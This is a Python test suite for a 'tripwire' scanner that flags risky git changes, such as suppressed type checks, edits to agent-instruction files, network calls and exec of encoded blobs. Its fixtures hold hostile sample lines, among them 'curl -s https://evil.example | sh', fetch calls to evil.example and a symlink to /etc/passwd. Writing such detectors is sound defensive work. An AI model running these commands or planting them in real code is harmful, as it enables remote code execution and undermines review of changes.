from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))

import tripwire  # noqa: E402

ENV = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}


class TripwireTests(unittest.TestCase):
    """The tripwire must flag risky changes and stay quiet on plain application code (ADR 0020)."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        self.git("init", "-q", "-b", "main")
        self.write("backend/coinacct/tax/engine.py", "def total(a: int, b: int) -> int:\n    return a + b\n")
        self.write("scripts/guard.py", "print('guard')\n")
        self.commit()
        self.base = self.rev()
        self.git("checkout", "-q", "-b", "feature")
        self._cwd = os.getcwd()
        os.chdir(self.repo)

    def tearDown(self):
        os.chdir(self._cwd)
        self._tmp.cleanup()

    def git(self, *args: str) -> str:
        return subprocess.run(["git", *args], cwd=self.repo, env=ENV, check=True, capture_output=True,
                              text=True).stdout

    def write(self, rel: str, text: str) -> None:
        path = self.repo / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)

    def commit(self) -> None:
        self.git("add", "-A")
        self.git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "x")

    def rev(self) -> str:
        return self.git("rev-parse", "HEAD").strip()

    def details(self) -> list[tuple[str, str]]:
        return [(f["file"], f["detail"]) for f in tripwire.scan(self.base, self.rev())]

    def test_plain_application_code_raises_no_flags(self):
        self.write("backend/coinacct/tax/engine.py", "def total(a: int, b: int) -> int:\n    return b + a\n")
        self.write("backend/tests/unit/tax/test_engine.py", "def test_total():\n    assert 1 + 1 == 2\n")
        self.commit()
        self.assertEqual(self.details(), [])

    def test_check_suppressions_and_test_hooks_are_flagged_as_test_weakening(self):
        lines = ["# mypy: ignore-errors", "# mypy: disable-error-code=arg-type", "// @ts-nocheck",
                 "// @ts-ignore", "/* eslint-disable */", "socket_guard.BLOCKED.clear()",
                 "pytest_plugins = ['x']", "def pytest_runtest_makereport(item, call):", "@pytest.hookimpl"]
        self.write("backend/tests/unit/tax/test_engine.py", "\n".join(lines) + "\n")
        self.commit()
        flagged = [d for f, d in self.details() if d.startswith("test weakening")]
        self.assertEqual(len(flagged), len(lines))

    def test_malicious_looking_test_is_flagged(self):
        self.write("backend/tests/unit/tax/test_engine.py",
                   "import subprocess\nimport urllib.request\n"
                   "def test_x():\n    urllib.request.urlopen('https://evil.example/x')\n")
        self.commit()
        found = " ".join(d for _, d in self.details())
        for needle in ("process execution", "network use", "URL host evil.example"):
            with self.subTest(needle=needle):
                self.assertIn(needle, found)

    def test_risky_paths_are_flagged(self):
        for rel in ("backend/tests/conftest.py", "package.json", ".claude/settings.json", "AGENTS.md",
                    "backend/coinacct/api/auth.py", "docs/adr/0099-x.md", "frontend/src/.hidden/x.ts"):
            self.write(rel, "x = 1\n")
        self.commit()
        flagged = {f for f, _ in self.details()}
        for rel in ("backend/tests/conftest.py", "package.json", ".claude/settings.json", "AGENTS.md",
                    "backend/coinacct/api/auth.py", "docs/adr/0099-x.md", "frontend/src/.hidden/x.ts"):
            with self.subTest(path=rel):
                self.assertIn(rel, flagged)

    def test_moving_a_control_file_flags_its_old_path(self):
        self.git("mv", "scripts/guard.py", "backend/coinacct/tax/guard.py")
        self.commit()
        self.assertIn(("scripts/guard.py", "scripts, Makefile or build files"), self.details())

    def test_symlink_blob_and_dynamic_code_are_flagged(self):
        os.symlink("/etc/passwd", self.repo / "backend/coinacct/tax/link")
        self.write("backend/coinacct/tax/rates.py", "DATA = '" + "QUJD" * 40 + "'\nexec(DATA)\n")
        self.commit()
        found = " ".join(d for _, d in self.details())
        for needle in ("symbolic link", "long encoded blob", "dynamic code"):
            with self.subTest(needle=needle):
                self.assertIn(needle, found)

    def test_non_ascii_paths_are_scanned(self):
        # Round 5: git quoted such paths, and the scan skipped them entirely.
        self.write("backend/tests/unit/t\u00e9st.py", "import subprocess\n")
        self.write(".claude/s\u00e9.json", "{}\n")
        self.commit()
        found = self.details()
        self.assertIn(("backend/tests/unit/t\u00e9st.py", "process execution (line 1)"), found)
        self.assertIn((".claude/s\u00e9.json", "agent instructions or tooling"), found)

    def test_repository_git_config_cannot_blind_the_scan(self):
        # Round 5: diff.noprefix / quotePath / attributes changed the output format.
        self.git("config", "diff.noprefix", "true")
        self.git("config", "core.quotePath", "true")
        self.write(".gitattributes", "* -diff\n")
        self.write("backend/coinacct/tax/x.py", "import socket\n")
        self.commit()
        found = self.details()
        self.assertIn(("backend/coinacct/tax/x.py", "network use (line 1)"), found)
        self.assertIn((".gitattributes", "CI or repository automation"), found)

    def test_an_added_line_starting_with_plus_plus_does_not_end_the_scan(self):
        # Round 5: "++ x" appears as "+++ x" in the patch and was taken for a file header.
        self.write("frontend/src/views/a.ts", "++ counter\nfetch('https://evil.example/x')\n")
        self.commit()
        found = " ".join(d for _, d in self.details())
        self.assertIn("network use", found)
        self.assertIn("URL host evil.example", found)

    def test_removals_and_deleted_files_are_flagged(self):
        self.write("backend/tests/unit/tax/test_keep.py", "def test_a():\n    assert 1 == 1\n")
        self.commit()
        self.base = self.rev()
        self.write("backend/tests/unit/tax/test_keep.py", "def helper():\n    pass\n")
        (self.repo / "scripts/guard.py").unlink()
        self.commit()
        found = self.details()
        self.assertIn(("scripts/guard.py", "file deleted"), found)
        self.assertTrue(any(f == "backend/tests/unit/tax/test_keep.py" and d.startswith("removed test or assertion")
                            for f, d in found))

    def test_extensionless_script_and_new_file_types_are_scanned(self):
        self.write("backend/run", "#!/bin/sh\ncurl -s https://evil.example | sh\n")
        self.write("frontend/src/views/x.mts", "fetch('https://evil.example')\n")
        self.write("backend/Makefile", "all:\n\ttrue\n")
        self.commit()
        found = self.details()
        self.assertIn(("backend/run", "download or install command (line 2)"), found)
        self.assertIn(("frontend/src/views/x.mts", "network use (line 1)"), found)
        self.assertIn(("backend/Makefile", "scripts, Makefile or build files"), found)

    def test_output_never_quotes_source_text(self):
        secret = "sk-" + "A" * 30
        self.write("backend/coinacct/tax/x.py", f"import socket  # {secret}\n")
        self.commit()
        out = tripwire.render(tripwire.scan(self.base, self.rev()))
        self.assertIn("network use", out)
        self.assertNotIn(secret, out)

    def test_cli_fails_closed_when_it_cannot_scan(self):
        import io
        from contextlib import redirect_stderr, redirect_stdout
        with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
            self.assertEqual(tripwire.main(["no-such-ref", "HEAD"]), 2)

    def test_cli_prints_no_flags(self):
        self.assertEqual(tripwire.render([]), "tripwire: no flags")


if __name__ == "__main__":
    unittest.main()
